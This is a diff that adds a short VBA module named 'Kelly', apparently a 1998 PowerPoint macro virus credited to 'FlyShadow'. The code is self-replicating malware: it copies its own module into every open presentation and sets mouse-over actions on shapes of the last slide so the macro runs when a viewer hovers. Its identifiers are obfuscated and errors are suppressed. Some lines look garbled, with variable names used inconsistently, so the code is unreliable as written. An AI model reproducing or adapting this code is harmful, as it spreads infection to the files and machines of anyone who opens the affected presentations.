@@ -1,0 +1,16 @@
+   Attribute VB_Name = "Kelly"
+   'Copyright (C) 1998 by FlyShadow ~^^~ - Kelly
+   Sub £d(Kelly)
+   On Error Resume Next
+   Set £\ = ActivePresentation.VBProject.VBComponents("Kelly").CodeModule
+   £h = £ \ .CountOfLines + 1: £f = £ \ .Lines(1, £h)
+   For Each £h In Presentations
+   If £h.VBProject.VBComponents(£\).Name <> £\ Then
+   £h.VBProject.VBComponents.Add(1).Name = £\
+   £h.VBProject.VBComponents(£\).CodeModule.InsertLines 1, £f
+   For Each £b In £h.Slides(£h.Slides.Count).Shapes
+   If £b.ActionSettings(ppMouseOver).Action = 0 Then _
+   £b.ActionSettings(ppMouseOver).Action = ppActionRunMacro: _
+   £b.ActionSettings(ppMouseOver).Run = "£d"
+   Next: End If: Next
+   End Sub
